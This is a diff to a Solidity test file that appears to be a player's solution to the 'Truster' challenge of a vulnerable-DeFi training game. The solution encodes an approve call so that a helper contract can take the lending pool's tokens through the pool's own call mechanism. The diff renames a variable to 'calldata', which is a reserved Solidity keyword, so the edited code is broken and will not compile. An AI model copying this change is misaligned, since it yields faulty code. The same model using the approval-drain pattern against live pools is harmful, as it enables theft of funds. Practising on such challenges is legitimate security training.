@@ -54,13 +54,13 @@ contract TrusterChallenge is Test {
      */
     function test_truster() public checkSolvedByPlayer {
         execute = new Execute();
-        bytes memory data = abi.encodeWithSignature(
+        bytes memory calldata = abi.encodeWithSignature(
             "approve(address,uint256)",
             address(execute),
             TOKENS_IN_POOL
         );
 
-        execute.execute(pool, token, recovery, TOKENS_IN_POOL, data);
+        execute.execute(pool, token, recovery, TOKENS_IN_POOL, calldata);
     }
 
     /**
